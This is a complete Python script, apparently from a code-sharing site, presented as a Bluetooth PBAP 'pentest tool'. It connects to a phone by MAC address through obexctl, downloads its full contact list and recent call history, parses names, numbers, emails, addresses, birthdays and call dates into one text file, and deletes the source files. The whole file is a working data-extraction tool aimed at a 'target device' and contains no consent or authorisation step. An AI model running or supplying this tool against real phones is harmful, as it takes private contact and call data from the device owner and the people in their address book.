#!/usr/bin/env python3
import pexpect
import sys
import time
import os
import shutil
import re

# ANSI Color codes for clean terminal output
class Colors:
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    BLUE = '\033[94m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# ---------------------------------------------------------
# GLOBAL CONFIGURATION & STATE
# ---------------------------------------------------------

TARGET_MAC = "" 
MAX_RETRIES = 5
MAX_ICH_FILES = 20 # Maximum number of call history files (e.g., 20 recent calls)

# ---------------------------------------------------------
# DISPLAY UTILITIES
# ---------------------------------------------------------

def print_banner():
    # Kawaii Logo
    kawaii_logo = f"""
{Colors.MAGENTA}{Colors.BOLD}
      ( ( ( ) ) )  
     / \\_\\U_/ /\\  
    |  (o_o)  |  PBAP Extractor
    | /\\~_/\\ |  v5.0
    |_|  ~  |_|  by Athena
{Colors.RESET}"""
    print(kawaii_logo)
    
    # Information Banner
    banner_info = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════╗
║  Bluetooth Data Extraction (PBAP/ICH) Pentest Tool    ║
║  Target MAC: {TARGET_MAC}                             ║
╚═══════════════════════════════════════════════════════╝
{Colors.RESET}"""
    print(banner_info)

def print_status(icon, message, color=Colors.CYAN):
    timestamp = time.strftime("%H:%M:%S", time.localtime())
    print(f"{Colors.DIM}[{timestamp}]{Colors.RESET} {color}{icon} {message}{Colors.RESET}")

def print_progress(message):
    print(f"{Colors.YELLOW}{'>' * 3} {message}{Colors.RESET}")

# ---------------------------------------------------------
# OBEXCTL INTERACTION FUNCTIONS
# ---------------------------------------------------------

def wait_transfer(child, timeout=300):
    """Waits for obexctl transfer status."""
    try:
        i = child.expect([
            r"Pull successful",
            r"Failed to copy",
            r"Error",
            pexpect.TIMEOUT
        ], timeout=10)
        
        if i != 0:
            return False
        
        i = child.expect([
            r"Status: complete",
            r"Status: error",
            pexpect.TIMEOUT
        ], timeout=10)
        
        if i != 0:
            return False
        
        return True
        
    except (pexpect.TIMEOUT, pexpect.EOF):
        return False

def cp_sequential(child, base_path, count_limit):
    """
    Copies VCF files sequentially (1.vcf, 2.vcf, ...) with conditional renaming 
    for ICH files to avoid conflicts in the staging directory (uio/).
    """
    print_status("⚡", f"Starting sequential copy mode for /{base_path}", Colors.MAGENTA)
    
    file_count = 0
    indices = range(1, count_limit + 1)
    safety_limit = 1000 if base_path == 'pb' else MAX_ICH_FILES
    
    for index in indices:
        source_file = f"{index}.vcf"
        
        # Rename ICH files during transfer to avoid overwriting PB files
        if base_path == 'ich':
            dest_file = f"uio/CALL_{index}.vcf"
        else: # 'pb'
            dest_file = f"uio/{source_file}"
        
        print_status("→", f"Attempting: cp {source_file} → {dest_file}", Colors.CYAN)
        
        child.sendline(f"cp {source_file} {dest_file}")
        
        if wait_transfer(child, timeout=60):
            print_status("✓", f"Successfully copied {source_file}", Colors.GREEN)
            file_count += 1
        else:
            print_status("⚠", f"Copy failed for {source_file} - assuming end of files", Colors.YELLOW)
            if base_path == 'pb':
                break
        
        try:
            child.expect("#", timeout=5)
        except:
            pass
        
        if file_count >= safety_limit:
            print_status("⚠", f"Reached safety limit of {safety_limit} files", Colors.YELLOW)
            break
            
        if base_path == 'ich' and index >= MAX_ICH_FILES:
            break
    
    return file_count

def connect_and_download(target_path, file_limit):
    """Establishes the OBEX PBAP/ICH connection and initiates download."""
    print_progress(f"Spawning OBEX control session for {target_path.upper()}...")
    child = pexpect.spawn("obexctl", encoding="utf-8", timeout=30)
    # child.logfile = sys.stdout # Commented for cleaner output on GitHub

    try:
        child.expect("#")
        print_status("→", f"Initiating connection to {Colors.BOLD}{TARGET_MAC}{Colors.RESET}", Colors.CYAN)
        child.sendline(f"connect {TARGET_MAC} pbap") 
        
        i = child.expect([
            "Connection successful",
            r"Failed to connect.*Error\.Failed",
            pexpect.TIMEOUT
        ], timeout=30)
        
        if i != 0:
            print_status("✗", "Connection failed", Colors.RED)
            child.close(force=True)
            return False
        
        print_status("✓", "Handshake successful", Colors.GREEN)
        child.expect("#")

        print_progress(f"Navigating to directory: /{target_path}...")
        child.sendline(f"cd {target_path}")
        child.expect("Select successful", timeout=10)
        child.expect("#")
        print_status("✓", f"Directory selected: /{target_path}", Colors.GREEN)

        file_count = cp_sequential(child, target_path, file_limit)
        
        if file_count > 0:
            print_status("✓", f"Download complete - {file_count} file(s) copied from /{target_path}", Colors.GREEN)
            time.sleep(0.5)
            child.sendline("quit")
            child.close(force=True)
            print_status("■", "Session terminated", Colors.CYAN)
            return True
        else:
            print_status("✗", f"No files were copied from /{target_path}", Colors.RED)
            child.close(force=True)
            return False
        
    except (pexpect.TIMEOUT, pexpect.EOF) as e:
        print_status("✗", f"Operation failed for /{target_path}: {e}", Colors.RED)
        try:
            child.close(force=True)
        except:
            pass
        return False

# ---------------------------------------------------------
# POST-DOWNLOAD UTILITIES
# ---------------------------------------------------------

def move_contacts_file():
    """
    Relocates downloaded files from system temp/home directories ('uio/') 
    to the current directory, renaming them to contact_N.vcf and callhist_N.vcf.
    """
    destination_dir = os.getcwd()
    files_moved = 0
    
    print_progress("Relocating payload files...")
    
    # Common directories where obexctl might place files
    source_dirs = [
        os.path.expanduser("~"),
        "/var/bluetooth/",
        "/root/",
        "/tmp/"
    ]
    
    for source_dir in source_dirs:
        uio_dir = os.path.join(source_dir, "uio")
        
        if not os.path.exists(uio_dir):
            continue
        
        print_status("→", f"Checking directory: {uio_dir}", Colors.CYAN)
        
        # 1. Contacts (1.vcf, 2.vcf, ...) -> Renamed to contact_N.vcf
        for i in range(1, 1001):
            source = os.path.join(uio_dir, f"{i}.vcf")
            destination = os.path.join(destination_dir, f"contact_{i}.vcf")
            
            if os.path.exists(source):
                try:
                    shutil.move(source, destination)
                    print_status("✓", f"Relocated: uio/{i}.vcf → {Colors.BOLD}contact_{i}.vcf{Colors.RESET}", Colors.GREEN)
                    files_moved += 1
                except Exception as e:
                    print_status("✗", f"Error moving uio/{i}.vcf: {e}", Colors.RED)

        # 2. Call History (CALL_1.vcf, CALL_2.vcf, ...) -> Renamed to callhist_N.vcf
        for i in range(1, MAX_ICH_FILES + 1):
            source = os.path.join(uio_dir, f"CALL_{i}.vcf")
            destination = os.path.join(destination_dir, f"callhist_{i}.vcf")

            if os.path.exists(source):
                try:
                    shutil.move(source, destination)
                    print_status("✓", f"Relocated: uio/CALL_{i}.vcf → {Colors.BOLD}callhist_{i}.vcf{Colors.RESET}", Colors.GREEN)
                    files_moved += 1
                except Exception as e:
                    print_status("✗", f"Error moving uio/CALL_{i}.vcf: {e}", Colors.RED)

        # Clean up the uio directory
        try:
            if not os.listdir(uio_dir):
                os.rmdir(uio_dir)
                print_status("◆", f"Cleaned up empty directory: {uio_dir}", Colors.DIM)
        except OSError:
            pass 
    
    if files_moved > 0:
        print_status("◆", f"Total files moved: {files_moved}", Colors.CYAN)
        return True
    else:
        print_status("⚠", f"No files found in uio/ subdirectories", Colors.YELLOW)
        return False

# ---------------------------------------------------------
# VCF PARSING AND MERGING
# ---------------------------------------------------------

def parse_vcf(vcf_content):
    """
    Parses the VCF content to extract Name, Phones, Emails, Org, and other 
    detailed fields using regular expressions.
    """
    contact_data = {}
    
    # Name (FN, N)
    fn_match = re.search(r"FN:([^\n\r]+)", vcf_content, re.IGNORECASE)
    if fn_match:
        contact_data['Nom'] = fn_match.group(1).strip()
    else:
        n_match = re.search(r"N:([^;\n\r]*);([^;\n\r]*);", vcf_content, re.IGNORECASE)
        if n_match:
            prenom = n_match.group(2).strip()
            nom = n_match.group(1).strip()
            contact_data['Nom'] = f"{prenom} {nom}".strip() if prenom or nom else "UNKNOWN"
        else:
            contact_data['Nom'] = "UNKNOWN"

    # Phones (TEL)
    tel_matches = re.findall(r"TEL(?:;[^:]*)*:([^\n\r]+)", vcf_content, re.IGNORECASE)
    contact_data['Téléphones'] = [tel.strip().replace('-', '').replace(' ', '') for tel in tel_matches]

    # Emails (EMAIL)
    email_matches = re.findall(r"EMAIL(?:;[^:]*)*:([^\n\r]+)", vcf_content, re.IGNORECASE)
    contact_data['Emails'] = [email.strip() for email in email_matches]

    # Detailed Fields
    org_match = re.search(r"ORG:([^\n\r]+)", vcf_content, re.IGNORECASE)
    if org_match:
        contact_data['Organisation'] = org_match.group(1).strip()
    
    title_match = re.search(r"TITLE:([^\n\r]+)", vcf_content, re.IGNORECASE)
    if title_match:
        contact_data['Titre'] = title_match.group(1).strip()
        
    note_match = re.search(r"NOTE:([^\n\r]+)", vcf_content, re.IGNORECASE | re.DOTALL)
    if note_match:
        contact_data['Note'] = note_match.group(1).strip()
        
    bday_match = re.search(r"BDAY:([^\n\r]+)", vcf_content, re.IGNORECASE)
    if bday_match:
        contact_data['Date de Naissance'] = bday_match.group(1).strip()

    adr_matches = re.findall(r"ADR(?:;[^:]*)*:([^ \n\r]+)", vcf_content, re.IGNORECASE)
    if adr_matches:
        contact_data['Adresses'] = [addr.strip() for addr in adr_matches]
    
    # Call History Fields (X-BT-CALL-TYPE & X-BT-CALL-DATE)
    call_type_match = re.search(r"X-BT-CALL-TYPE:([^\n\r]+)", vcf_content, re.IGNORECASE)
    if call_type_match:
        contact_data['Type d\'Appel'] = call_type_match.group(1).strip()
        
    call_date_match = re.search(r"X-BT-CALL-DATE:([^\n\r]+)", vcf_content, re.IGNORECASE)
    if call_date_match:
        contact_data['Date d\'Appel'] = call_date_match.group(1).strip()
    
    return contact_data

def parse_merge_and_cleanup():
    """
    Parses individual VCF files, merges the extracted data into a single file, 
    and deletes the original VCF files.
    """
    output_file = "contacts_and_calls_parsed_merged.txt"
    vcf_files = sorted([f for f in os.listdir('.') if f.endswith(".vcf") and (f.startswith("contact_") or f.startswith("callhist_"))])

    if not vcf_files:
        print_status("⚠", "No VCF files found for merging.", Colors.YELLOW)
        return False

    print_progress("Parsing and merging VCF files (Contacts & Calls) into a single text file...")
    
    parsed_count = 0

    with open(output_file, "w", encoding="utf-8") as outfile:
        for vcf in vcf_files:
            try:
                with open(vcf, "r", encoding="utf-8") as infile:
                    content = infile.read()

                data = parse_vcf(content)
                
                is_call_hist = vcf.startswith("callhist_")
                
                # Header
                header = "CALL HISTORY" if is_call_hist else "CONTACT"
                outfile.write(f"*** {header} {parsed_count + 1} ({vcf}) ***\n")
                
                # Specific Call History fields (Using .format() for safety)
                if is_call_hist:
                    outfile.write("TYPE D'APPEL : {}\n".format(data.get("Type d'Appel", 'N/A')))
                    outfile.write("DATE D'APPEL : {}\n".format(data.get("Date d'Appel", 'N/A')))
                    
                # Core Contact fields
                outfile.write(f"NOM : {data.get('Nom', 'N/A')}\n")
                tels = ", ".join(data.get('Téléphones', []))
                outfile.write(f"TÉLÉPHONES : {tels if tels else 'N/A'}\n")
                emails = ", ".join(data.get('Emails', []))
                outfile.write(f"EMAILS : {emails if emails else 'N/A'}\n")
                
                # Other fields
                other_info = []
                if 'Organisation' in data:
                    other_info.append(f"Organisation: {data['Organisation']}")
                if 'Titre' in data:
                    other_info.append(f"Titre/Poste: {data['Titre']}")
                if 'Date de Naissance' in data:
                    other_info.append(f"Date de Naissance: {data['Date de Naissance']}")
                if 'Adresses' in data:
                    other_info.append(f"Adresse(s): {'; '.join(data['Adresses'])}")
                if 'Note' in data:
                    note_content = data['Note'].replace('\n', ' ').strip()
                    other_info.append(f"Note: {note_content[:100]}{'...' if len(note_content) > 100 else ''}")

                if other_info:
                    outfile.write("AUTRES INFOS :\n")
                    for info in other_info:
                        outfile.write(f"  - {info}\n")
                else:
                    outfile.write("AUTRES INFOS : N/A\n")
                
                outfile.write("-" * 30 + "\n\n")
                parsed_count += 1
                
            except Exception as e:
                print_status("✗", f"Error reading or parsing {vcf}: {e}", Colors.RED)

    print_status("✓", f"File generated: {Colors.BOLD}{output_file}{Colors.RESET} ({parsed_count} records)", Colors.GREEN)

    print_progress("Deleting individual VCF files...")
    for vcf in vcf_files:
        try:
            os.remove(vcf)
            print_status("✗", f"Deleted: {vcf}", Colors.CYAN)
        except Exception as e:
            print_status("⚠", f"Error deleting {vcf}: {e}", Colors.YELLOW)

    print_status("◆", "Merging and cleanup complete", Colors.GREEN)
    return True


# ---------------------------------------------------------
# MAIN EXECUTION
# ---------------------------------------------------------

def validate_mac(mac_address):
    """Simple MAC address validation."""
    return re.match(r'^([0-9A-F]{2}[:-]){5}([0-9A-F]{2})$', mac_address)

def main():
    
    global TARGET_MAC 
    
    # 1. Get MAC Address Input
    while True:
        os.system('clear')
        print_banner()
        mac_address = input(f"{Colors.BLUE}{Colors.BOLD}Enter the target device MAC address (e.g., 12:34:56:78:90:AB) : {Colors.RESET}").strip().upper()
        
        if validate_mac(mac_address):
            TARGET_MAC = mac_address.replace('-', ':') 
            break
        else:
            print_status("⚠", "Invalid MAC format. Please try again.", Colors.YELLOW)
            time.sleep(1)

    # 2. Start Execution
    os.system('clear')
    print_banner() 
    print_status("◆", f"Target device: {Colors.BOLD}{TARGET_MAC}{Colors.RESET}", Colors.CYAN)
    print_status("◆", f"Max retry attempts: {Colors.BOLD}{MAX_RETRIES}{Colors.RESET}", Colors.CYAN)
    print_status("◆", "Strategy: PBAP (Contacts) and ICH (Call History) extraction", Colors.MAGENTA)
    print()
    
    success_contact = False
    success_call_hist = False
    
    for attempt in range(1, MAX_RETRIES + 1):
        print(f"\n{Colors.BLUE}{Colors.BOLD}{'─' * 55}")
        print(f"  ATTEMPT {attempt}/{MAX_RETRIES}")
        print(f"{'─' * 55}{Colors.RESET}\n")
        
        # 1. DOWNLOAD CONTACTS (pb directory)
        if not success_contact:
            print(f"\n{Colors.MAGENTA}--- 1. CONTACTS (PB) --{Colors.RESET}")
            success_contact = connect_and_download("pb", 1000)
        
        # 2. DOWNLOAD CALL HISTORY (ich directory)
        if not success_call_hist:
            print(f"\n{Colors.MAGENTA}--- 2. CALL HISTORY (ICH) --{Colors.RESET}")
            success_call_hist = connect_and_download("ich", MAX_ICH_FILES)
        
        # Check if at least one operation succeeded
        if success_contact or success_call_hist:
            if move_contacts_file():
                parse_merge_and_cleanup()

                print(f"\n{Colors.GREEN}{Colors.BOLD}╔═══════════════════════════════════════════════════════╗")
                print(f"║             OPERATION SUCCESSFUL                      ║")
                print(f"╚═══════════════════════════════════════════════════════╝{Colors.RESET}\n")
                sys.exit(0)
            else:
                print_status("⚠", "Download succeeded but file relocation/parsing failed", Colors.YELLOW)
                sys.exit(1)
        
        if attempt < MAX_RETRIES:
            print_status("⟳", "Retrying in 2 seconds...", Colors.YELLOW)
            time.sleep(2)
    
    print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════╗")
    print(f"║     OPERATION FAILED AFTER {MAX_RETRIES} ATTEMPTS             ║")
    print(f"╚═══════════════════════════════════════════════════════╝{Colors.RESET}\n")
    sys.exit(1)

if __name__ == "__main__":
    main()
